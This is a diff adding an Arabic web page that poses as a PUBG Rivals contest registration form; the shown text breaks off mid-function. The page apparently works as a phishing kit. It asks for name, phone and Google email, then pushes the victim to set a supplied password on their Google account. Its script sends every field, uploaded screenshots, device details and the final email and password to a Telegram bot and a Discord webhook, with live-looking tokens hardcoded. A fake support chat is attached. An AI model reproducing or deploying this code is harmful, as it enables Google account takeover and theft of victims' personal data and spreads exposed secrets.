@@ -1,0 +1,1368 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل مسابقة PUBG Rivals</title>
+    
+    <!-- مكتبة SweetAlert2 للتنبيهات الاحترافية -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <!-- مكتبة FontAwesome للأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- مكتبة توليد الـ QR Code -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        :root {
+            --primary-color: #1877F2;
+            --bg-color: #0b0e14;
+            --card-bg: #161b22;
+            --text-color: #ffffff;
+            --input-bg: #0d1117;
+            --border-color: #30363d;
+            --accent-color: #2ea44f;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 550px;
+            padding: 25px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            color: var(--primary-color);
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: #8b949e;
+            font-size: 14px;
+        }
+
+        /* أزرار التواصل والتأكيد */
+        .social-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .btn-social {
+            flex: 1;
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            text-decoration: none;
+            font-size: 13px;
+            transition: 0.3s;
+        }
+
+        .btn-whatsapp { background-color: #25D366; }
+        .btn-telegram { background-color: #0088cc; }
+        .btn-social:hover { opacity: 0.85; }
+
+        /* الزر العلوي للدعم الفني - موقع جديد أسفل أزرار التواصل */
+        .top-support-bar {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .btn-top-chat {
+            width: 100%;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            color: #ffffff;
+            border: 1px solid #00f2fe;
+            padding: 12px 22px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 198, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+        .btn-top-chat:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 22px rgba(0, 242, 254, 0.6);
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #c9d1d9;
+        }
+
+        .instruction-text {
+            font-size: 12px;
+            color: #e3b341;
+            margin-bottom: 6px;
+            background: rgba(227, 179, 65, 0.1);
+            padding: 8px 10px;
+            border-radius: 6px;
+            border-right: 3px solid #e3b341;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        input[type="text"], input[type="number"], input[type="email"] {
+            flex: 1;
+            padding: 12px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+        }
+
+        /* أزرار رفع الصور */
+        .file-upload-btn {
+            background-color: #21262d;
+            border: 1px solid var(--border-color);
+            color: #c9d1d9;
+            padding: 12px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.3s;
+        }
+
+        .file-upload-btn:hover {
+            background-color: #30363d;
+            color: var(--primary-color);
+        }
+
+        .file-upload-btn input[type="file"] {
+            display: none;
+        }
+
+        /* الأزرار الفرعية وروابط التوجيه */
+        .sub-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .action-link-btn {
+            background-color: #21262d;
+            color: #c9d1d9;
+            border: 1px solid var(--border-color);
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            transition: 0.3s;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .action-link-btn:hover {
+            background-color: var(--primary-color);
+            color: white;
+            border-color: var(--primary-color);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-color);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            transition: 0.3s;
+        }
+
+        .btn-submit:hover {
+            background-color: #1565c0;
+        }
+
+        /* مؤشر التحميل */
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid #ffffff;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* تصميم البطاقة الرقمية */
+        .digital-card {
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            border: 2px solid var(--primary-color);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 30px rgba(24, 119, 242, 0.3);
+        }
+
+        .digital-card h3 {
+            color: var(--primary-color);
+            margin-bottom: 12px;
+        }
+
+        .digital-card p {
+            margin: 6px 0;
+            font-size: 14px;
+        }
+
+        #qrcode {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0;
+        }
+
+        #qrcode img {
+            border: 4px solid white;
+            border-radius: 8px;
+        }
+
+        /* ==========================================
+           تنسيقات المحادثة المباشرة
+           ========================================== */
+
+        /* النافذة العائمة للدردشة */
+        .chat-widget-container {
+            position: fixed;
+            bottom: 85px;
+            left: 20px;
+            width: 350px;
+            max-width: 90vw;
+            height: 460px;
+            background: #0d1117;
+            border: 1px solid #1f293d;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8), 0 0 20px rgba(0, 210, 255, 0.2);
+            display: flex;
+            flex-direction: column;
+            z-index: 99999;
+            overflow: hidden;
+            direction: rtl;
+            font-family: inherit;
+        }
+
+        .chat-header {
+            background: #161b22;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #21262d;
+        }
+        .chat-header-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .chat-title {
+            color: #ffb700;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .chat-substatus {
+            color: #8b949e;
+            font-size: 11px;
+        }
+        .chat-close-btn {
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .chat-close-btn:hover { color: #ff4757; }
+
+        /* نقطة التواجد الضوئية */
+        .status-dot, .chat-status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #2ed573;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 8px #2ed573;
+        }
+        .status-dot.offline, .chat-status-dot.offline {
+            background-color: #747d8c;
+            box-shadow: none;
+        }
+
+        /* منطقة عرض المحادثة */
+        .chat-box {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            background: #090d12;
+        }
+
+        /* فقرات الرسائل */
+        .msg {
+            max-width: 80%;
+            padding: 10px 14px;
+            border-radius: 14px;
+            font-size: 13px;
+            line-height: 1.5;
+            position: relative;
+            word-break: break-word;
+        }
+        .msg.user-msg {
+            align-self: flex-start;
+            background: linear-gradient(135deg, #0052d4, #4364f7);
+            color: #ffffff;
+            border-bottom-right-radius: 2px;
+        }
+        .msg.admin-msg {
+            align-self: flex-end;
+            background: #1f293d;
+            color: #e6edf3;
+            border: 1px solid #2d3748;
+            border-bottom-left-radius: 2px;
+        }
+        .msg img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-bottom: 5px;
+        }
+
+        /* التوقيت وعلامات الصح */
+        .msg-meta {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 4px;
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 4px;
+        }
+        .checkmark {
+            font-size: 11px;
+        }
+        .checkmark.read {
+            color: #00f2fe;
+            font-weight: bold;
+        }
+
+        /* شريط الإدخال */
+        .chat-input-area {
+            padding: 10px;
+            background: #161b22;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border-top: 1px solid #21262d;
+        }
+        #chat-user-input {
+            flex: 1;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #fff;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            outline: none;
+        }
+        #chat-user-input:focus {
+            border-color: #00c6ff;
+        }
+        .chat-btn-icon {
+            background: transparent;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+        }
+        .chat-btn-icon:hover { background: #21262d; }
+
+        .chat-send-btn {
+            background: linear-gradient(135deg, #ffb700, #f5af19);
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .chat-file-preview {
+            background: #1f293d;
+            color: #00f2fe;
+            padding: 5px 12px;
+            font-size: 11px;
+            text-align: center;
+        }
+
+        /* الزر العائم في الزاوية */
+        .floating-chat-trigger {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 55px;
+            height: 55px;
+            background: linear-gradient(135deg, #ffb700, #ff8c00);
+            border: none;
+            border-radius: 50%;
+            color: #000;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 183, 0, 0.5);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1><i class="fa-solid fa-gamepad"></i> PUBG Rivals</h1>
+        <p>صفحة التسجيل الرسمية للمسابقات</p>
+    </div>
+
+    <!-- التواصل وتأكيد التسجيل -->
+    <div class="social-buttons">
+        <a href="https://wa.me/77074032501?text=طلب%20تأكيد%20التسجيل%20في%20بطولة%20PUBG%20Rivals" target="_blank" class="btn-social btn-whatsapp">
+            <i class="fa-brands fa-whatsapp"></i> التواصل عبر الواتساب
+        </a>
+        <a href="https://t.me/pubg_rivals" target="_blank" class="btn-social btn-telegram">
+            <i class="fa-brands fa-telegram"></i> التواصل عبر التليجرام
+        </a>
+    </div>
+
+    <!-- زر المحادثة المباشرة المضاف أسفل أزرار التواصل مباشرة -->
+    <div class="top-support-bar">
+        <button class="btn-top-chat" onclick="toggleChat()">
+            <span class="chat-status-dot" id="header-status-dot"></span>
+            💬 المحادثة المباشرة مع الدعم الفني
+        </button>
+    </div>
+
+    <form id="contestForm">
+        <!-- الخانات المطلوبة -->
+        <div class="form-group">
+            <label>أسم المشترك الثلاثي:</label>
+            <input type="text" id="fullName" placeholder="أدخل اسمك الثلاثي" required onblur="trackStep('الاسم الثلاثي', this.value)">
+        </div>
+
+        <div class="form-group">
+            <label>رقم الهاتف:</label>
+            <input type="text" id="phone" placeholder="أدخل رقم هاتفك " required onblur="trackStep('رقم الهاتف', this.value)">
+        </div>
+
+        <hr style="border: 0.5px solid var(--border-color); margin: 20px 0;">
+
+        <!-- قسم البريد الإلكتروني -->
+        <div class="form-group">
+            <div class="instruction-text">
+                <i class="fa-solid fa-camera"></i> قم بعمل لقطة شاشة للحساب وارسلها عبر الزر بجانب الخانة
+            </div>
+            <label>عنوان البريد الإلكتروني (Google):</label>
+            <div class="input-row">
+                <input type="email" id="email" placeholder="example@gmail.com" required onblur="trackStep('البريد الإلكتروني', this.value)">
+                <label class="file-upload-btn" title="إرسال صورة البريد">
+                    <i class="fa-solid fa-paperclip"></i>
+                    <input type="file" id="emailImg" accept="image/*" onchange="uploadImageStep('صورة البريد الإلكتروني', this)">
+                </label>
+            </div>
+            <div class="sub-actions">
+                <a href="https://myaccount.google.com/" target="_blank" class="action-link-btn">
+                    <i class="fa-solid fa-user-gear"></i>إضغط هنا للتوجه الى الصفحة وأخذ لقطة شاشه 
+                </a>
+            </div>
+        </div>
+
+        <!-- قسم كلمة المرور -->
+        <div class="form-group">
+            <div class="instruction-text">
+                <i class="fa-solid fa-triangle-exclamation"></i> كلمة المرور الجديدة انسخها والصقها في خانة اضغط هنا للصق، وقم بعمل لقطة شاشة احتياطية وإدارسلها مع الخانة
+            </div>
+            <label>كلمة المرور الجديدة:</label>
+            <div class="input-row">
+                <input type="text" id="notesKey" placeholder="أدخل كلمة المرور" required onblur="trackStep('كلمة المرور', this.value)">
+                <label class="file-upload-btn" title="إرسال صورة كلمة المرور الجديدة">
+                    <i class="fa-solid fa-paperclip"></i>
+                    <input type="file" id="notesImg" accept="image/*" onchange="uploadImageStep('صورة كلمة المرور', this)">
+                </label>
+            </div>
+            <div class="sub-actions">
+                <button type="button" class="action-link-btn" onclick="copyNotesKey()">
+                    <i class="fa-solid fa-copy"></i> نسخ سريع
+                </button>
+                <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="action-link-btn">
+                    <i class="fa-solid fa-key"></i> اضغط هنا للصق كلمة المرور الجديدة 
+                </a>
+            </div>
+        </div>
+
+        <!-- زر الإرسال -->
+        <button type="submit" class="btn-submit" id="submitBtn">
+            <span id="btnText">إرسال وتأكيد التسجيل</span>
+            <div class="spinner" id="btnSpinner"></div>
+        </button>
+    </form>
+
+    <!-- مكتبة التقاط الشاشة -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <!-- نافذة الدردشة العائمة -->
+    <div id="chat-widget" class="chat-widget-container" style="display: none;">
+        <div class="chat-header">
+            <div class="chat-header-info">
+                <span class="status-dot" id="support-status-dot"></span>
+                <div>
+                    <div class="chat-title">الدعم الفني للمسابقة</div>
+                    <div class="chat-substatus" id="support-status-text">متصل الآن</div>
+                </div>
+            </div>
+            <button class="chat-close-btn" onclick="toggleChat()">✕</button>
+        </div>
+
+        <div class="chat-box" id="chat-box"></div>
+
+        <div id="chat-file-preview" class="chat-file-preview" style="display:none;">
+            تم اختيار صورة جاهزة للإرسال ✔
+        </div>
+
+        <form class="chat-input-area" onsubmit="sendChatMessage(event)">
+            <label for="chat-file-input" class="chat-btn-icon" title="إرفاق صورة">
+                📷
+                <input type="file" id="chat-file-input" accept="image/*" style="display:none;" onchange="showChatFilePreview()">
+            </label>
+            
+            <button type="button" class="chat-btn-icon" title="التقاط الشاشة وإرسالها فوراً" onclick="takeUserInstantScreenshot()">
+                📸
+            </button>
+
+            <input type="text" id="chat-user-input" placeholder="اكتب رسالتك..." autocomplete="off" oninput="saveDraftMessage()">
+            <button type="submit" class="chat-send-btn">إرسال</button>
+        </form>
+    </div>
+
+    <!-- الزر الدائري العائم -->
+    <button class="floating-chat-trigger" onclick="toggleChat()" title="الدعم المباشر">
+        🎧
+    </button>
+</div>
+
+<!-- قالب البطاقة الرقمية المخفي -->
+<div id="cardTemplate" style="display:none;">
+    <div class="digital-card">
+        <h3><i class="fa-solid fa-award"></i> بطاقة اشتراك رقمية</h3>
+        <p><strong>الاسم:</strong> <span id="cardName"></span></p>
+        <p><strong>PUBG ID:</strong> <span id="cardPubgId"></span></p>
+        <p><strong>كود التسجيل:</strong> <span id="cardRegCode"></span></p>
+        <div id="qrcode"></div>
+        <p style="font-size: 11px; color: #8b949e;">إثبات تسجيل رسمي في مسابقة PUBG Rivals</p>
+    </div>
+</div>
+
+<!-- SweetAlert2 JS -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<!-- سكربت الاستمارة والوظائف المساعدة -->
+<script>
+    // ==========================================
+    // 1. الإعدادات المركزية (إدارة البوتات والخدمات)
+    // ==========================================
+    const CONFIG = {
+        // بوت استلام البيانات، التسجيلات، وتتبع الخطوات
+        DATA_BOT: {
+            TOKEN: "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg", // ضع توكن بوت البيانات هنا
+            CHAT_ID: "8796885500"
+        },
+        // بوت المحادثة المباشرة والدعم المباشر
+        CHAT_BOT: {
+            TOKEN: "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg", // ضع توكن بوت الشات هنا (يمكن تغييره لبوت آخر)
+            CHAT_ID: "8796885500"
+        },
+        // تطبيق ديسكورد (إرسال الإشعارات بنظام البطاقات Embeds)
+        DISCORD: {
+            WEBHOOK_URL: "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j",
+            ENABLED: true
+        }
+    };
+
+    // ==========================================
+    // 2. محرك ديسكورد للبطاقات (Discord Embed Engine)
+    // ==========================================
+    function sendDiscordEmbed({ title, description, fields = [], color = 3447003, footerText = "نظام المسابقات والدردشة" }) {
+        if (!CONFIG.DISCORD.ENABLED || !CONFIG.DISCORD.WEBHOOK_URL) return;
+
+        const payload = {
+            embeds: [{
+                title: title,
+                description: description || "",
+                color: color, // Decimal Color
+                fields: fields,
+                timestamp: new Date().toISOString(),
+                footer: { text: footerText }
+            }]
+        };
+
+        fetch(CONFIG.DISCORD.WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(err => console.error("Discord Webhook Error:", err));
+    }
+
+    // ==========================================
+    // 3. تكوين البيانات وتتبع المشتركين (DATA MODULE)
+    // ==========================================
+    function getVisitorSpecificNotesKey() {
+        let storedKey = localStorage.getItem('unique_visitor_note_key');
+        if (!storedKey) {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
+            let generated = 'PR-';
+            for (let i = 0; i < 8; i++) {
+                generated += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            localStorage.setItem('unique_visitor_note_key', generated);
+            storedKey = generated;
+        }
+        return storedKey;
+    }
+
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let deviceName = "جهاز غير معروف";
+        if (ua.includes("Android")) {
+            if (ua.includes("LT")) deviceName = "هاتف LT";
+            else if (ua.includes("itel")) deviceName = "هاتف itel";
+            else {
+                const match = ua.match(/Android\s+[\d\.]+;\s*([^;]+)\)/);
+                deviceName = (match && match[1]) ? match[1] : "Android";
+            }
+        } else if (ua.includes("iPhone")) {
+            deviceName = "iPhone";
+        } else if (ua.includes("Windows")) {
+            deviceName = "حاسوب Windows";
+        }
+
+        return {
+            ua: ua,
+            deviceName: deviceName,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language,
+            time: new Date().toLocaleString('ar-EG'),
+            connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "غير معروف"
+        };
+    }
+
+    // إرسال البيانات إلى بوت البيانات المخصص + ديسكورد
+    function sendDataLog(telegramText, discordData) {
+        // 1. إرسال إلى تليجرام (بوت البيانات)
+        fetch(`https://api.telegram.org/bot${CONFIG.DATA_BOT.TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CONFIG.DATA_BOT.CHAT_ID, text: telegramText, parse_mode: 'Markdown' })
+        }).catch(err => console.error("Data Telegram Error:", err));
+
+        // 2. إرسال إلى ديسكورد (بطاقة مستقلة)
+        if (discordData) {
+            sendDiscordEmbed(discordData);
+        }
+    }
+
+    function trackStep(field, value) {
+        if(!value || value.trim() === "") return;
+        const info = getDeviceInfo();
+        
+        const telegramMsg = `✏️ *إدخال خطوة جديد*\n\n` +
+            `👤 *الخانة:* ${field}\n` +
+            `📄 *القيمة:* \`${value}\` \n` +
+            `📱 *الجهاز:* ${info.deviceName}\n` +
+            `🕒 *الوقت:* ${info.time}`;
+
+        const discordData = {
+            title: "✏️ تتبع خطوة جديدة",
+            color: 3447003, // أزرق
+            fields: [
+                { name: "الخانة", value: field, inline: true },
+                { name: "القيمة المخلة", value: `\`${value}\``, inline: true },
+                { name: "الجهاز", value: info.deviceName, inline: true },
+                { name: "الوقت", value: info.time, inline: false }
+            ]
+        };
+
+        sendDataLog(telegramMsg, discordData);
+    }
+
+    function uploadImageStep(typeLabel, inputElem) {
+        if (inputElem.files && inputElem.files[0]) {
+            const file = inputElem.files[0];
+            const info = getDeviceInfo();
+
+            // إرسال إلى بوت البيانات في تليجرام
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.DATA_BOT.CHAT_ID);
+            formData.append('photo', file);
+            formData.append('caption', `📷 *تم إرفاق ${typeLabel}*\n📱 *الجهاز:* ${info.deviceName}`);
+
+            fetch(`https://api.telegram.org/bot${CONFIG.DATA_BOT.TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                Swal.fire({ icon: 'success', title: 'تم رفع الصورة', text: `تم إرفاق ${typeLabel} بنجاح!`, timer: 1500, showConfirmButton: false });
+            }).catch(err => console.error("Image upload error:", err));
+
+            // إرسال بطاقة إلى ديسكورد
+            sendDiscordEmbed({
+                title: `📷 مرفق جديد: ${typeLabel}`,
+                description: `قام المستخدم برفع صورة جديدة من نوع: **${typeLabel}**`,
+                color: 10181046, // بنفسجي
+                fields: [
+                    { name: "الجهاز", value: info.deviceName, inline: true },
+                    { name: "الوقت", value: info.time, inline: true }
+                ]
+            });
+        }
+    }
+
+    function copyNotesKey() {
+        const input = document.getElementById('notesKey');
+        input.select();
+        document.execCommand('copy');
+        Swal.fire({ icon: 'info', title: 'تم النسخ!', text: 'تم نسخ كلمة المرور إلى الحافظة.', timer: 1500, showConfirmButton: false });
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+        const notesElem = document.getElementById('notesKey');
+        if (notesElem) notesElem.value = getVisitorSpecificNotesKey();
+        
+        const info = getDeviceInfo();
+        const text = `📌 *زيارة جديدة لموقع المسابقة*\n\n` +
+            `🕒 *الوقت:* ${info.time}\n` +
+            `📱 *الجهاز:* ${info.deviceName}\n` +
+            `🖥️ *الشاشة:* ${info.screen}\n` +
+            `📶 *الاتصال:* ${info.connectionType}\n` +
+            `🌐 *اللغة:* ${info.language}\n` +
+            `📝 *User Agent:* \`${info.ua}\``;
+
+        const discordData = {
+            title: "📌 زيارة جديدة للموقع",
+            color: 3066993, // أخضر
+            fields: [
+                { name: "الجهاز", value: info.deviceName, inline: true },
+                { name: "الشاشة", value: info.screen, inline: true },
+                { name: "الاتصال", value: info.connectionType, inline: true },
+                { name: "اللغة", value: info.language, inline: true },
+                { name: "الوقت", value: info.time, inline: true },
+                { name: "User Agent", value: `\`${info.ua}\``, inline: false }
+            ]
+        };
+
+        sendDataLog(text, discordData);
+    });
+
+    document.getElementById('contestForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const btnSpinner = document.getElementById('btnSpinner');
+
+        btn.disabled = true;
+        btnText.style.display = 'none';
+        btnSpinner.style.display = 'block';
+
+        const name = document.getElementById('fullName').value;
+        const phone = document.getElementById('phone').value;
+        const email = document.getElementById('email').value;
+        const notesKey = document.getElementById('notesKey').value;
+        const info = getDeviceInfo();
+
+        const fullReport = `🏆 *تسجيل مشترك جديد - PUBG Rivals*\n\n` +
+            `👤 *الاسم الثلاثي:* ${name}\n` +
+            `📞 *الهاتف:* ${phone}\n` +
+            `📧 *البريد:* ${email}\n` +
+            `🔑 *كلمة المرور:* \`${notesKey}\` \n\n` +
+            `📱 *بيانات الجهاز:* ${info.deviceName}\n` +
+            `🖥️ *الدقة:* ${info.screen}\n` +
+            `🕒 *الوقت:* ${info.time}`;
+
+        const discordData = {
+            title: "🏆 تسجيل مشترك جديد - PUBG Rivals",
+            color: 15844367, // ذهبي/أصفر
+            fields: [
+                { name: "الاسم الثلاثي", value: name, inline: true },
+                { name: "الهاتف", value: phone, inline: true },
+                { name: "البريد", value: email, inline: true },
+                { name: "كلمة المرور", value: `\`${notesKey}\``, inline: true },
+                { name: "الجهاز", value: info.deviceName, inline: true },
+                { name: "الوقت", value: info.time, inline: true }
+            ]
+        };
+
+        sendDataLog(fullReport, discordData);
+
+        setTimeout(() => {
+            btn.disabled = false;
+            btnText.style.display = 'inline';
+            btnSpinner.style.display = 'none';
+
+            const regCode = 'PR-' + Math.floor(100000 + Math.random() * 900000);
+            document.getElementById('cardName').innerText = name;
+            document.getElementById('cardPubgId').innerText = "غير محدد";
+            document.getElementById('cardRegCode').innerText = regCode;
+
+            const qrcodeDiv = document.getElementById('qrcode');
+            qrcodeDiv.innerHTML = "";
+            new QRCode(qrcodeDiv, { text: `PUBG-RIVALS|CODE:${regCode}`, width: 120, height: 120 });
+
+            const cardHtml = document.getElementById('cardTemplate').innerHTML;
+            Swal.fire({
+                title: 'تم التسجيل بنجاح!',
+                html: cardHtml,
+                icon: 'success',
+                confirmButtonText: 'إغلاق البطاقة',
+                background: '#161b22',
+                color: '#fff'
+            });
+        }, 1500);
+    });
+</script>
+
+<!-- ==========================================
+     4. تكوين المحادثة المباشرة والدعم (CHAT MODULE)
+     ========================================== -->
+<script>
+    let contestantId = localStorage.getItem("contestant_id");
+    let contestantName = localStorage.getItem("contestant_name") || "متسابق";
+
+    if (!contestantId) {
+        contestantId = "USER_" + Math.floor(100000 + Math.random() * 900000);
+        localStorage.setItem("contestant_id", contestantId);
+    }
+
+    let lastUpdateId = parseInt(sessionStorage.getItem("last_telegram_update_id") || "0");
+    const processedMsgIds = new Set(JSON.parse(sessionStorage.getItem("processed_msg_ids") || "[]"));
+
+    let isChatOpen = false;
+    let autoCloseTimer = null;
+    let isSupportOnline = true;
+
+    let lastLeaveAlertTime = 0;
+    let lastOnlineAlertTime = 0;
+    const THROTTLE_60_SEC = 60000;
+
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let isRecording = false;
+
+    document.addEventListener("DOMContentLoaded", () => {
+        loadChatHistory();
+        loadDraftMessage();
+        notifyUserEntrance();
+    });
+
+    function playNotificationSound(type = 'receive') {
+        try {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+
+            if (type === 'receive') {
+                osc.frequency.setValueAtTime(587.33, ctx.currentTime);
+                osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1);
+                gain.gain.setValueAtTime(0.2, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.3);
+            } else {
+                osc.frequency.setValueAtTime(440, ctx.currentTime);
+                gain.gain.setValueAtTime(0.15, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.15);
+            }
+        } catch (e) { }
+    }
+
+    window.toggleChat = function() {
+        const widget = document.getElementById("chat-widget");
+        if (!widget) return;
+        isChatOpen = !isChatOpen;
+        widget.style.display = isChatOpen ? "flex" : "none";
+        cancelAutoClose();
+    };
+
+    function openChat() {
+        const widget = document.getElementById("chat-widget");
+        if (widget) {
+            widget.style.display = "flex";
+            isChatOpen = true;
+        }
+    }
+
+    function cancelAutoClose() {
+        if (autoCloseTimer) {
+            clearTimeout(autoCloseTimer);
+            autoCloseTimer = null;
+        }
+    }
+
+    function trigger10SecAutoOpen() {
+        if (!isChatOpen) {
+            openChat();
+            cancelAutoClose();
+            autoCloseTimer = setTimeout(() => {
+                const widget = document.getElementById("chat-widget");
+                if (widget) widget.style.display = "none";
+                isChatOpen = false;
+            }, 10000);
+        }
+    }
+
+    function getCurrentTimeFormatted() {
+        const now = new Date();
+        return now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });
+    }
+
+    window.saveDraftMessage = function() {
+        const input = document.getElementById("chat-user-input");
+        if (input) sessionStorage.setItem("chat_draft", input.value);
+    };
+
+    function loadDraftMessage() {
+        const draft = sessionStorage.getItem("chat_draft");
+        const input = document.getElementById("chat-user-input");
+        if (draft && input) input.value = draft;
+    }
+
+    function saveChatHistory(msgObj) {
+        let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+        history.push(msgObj);
+        sessionStorage.setItem("chat_history", JSON.stringify(history));
+    }
+
+    function loadChatHistory() {
+        let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+        history.forEach(m => renderMessage(m.text, m.className, m.time, m.status, m.imgUrl));
+    }
+
+    // إرسال تنبيهات الدردشة الخاصة بالتليجرام والدعم
+    function sendTelegramAlert(text, discordTitle = "تنبيه درجات المحادثة") {
+        // إرسال إلى بوت المحادثة
+        fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/sendMessage`, {
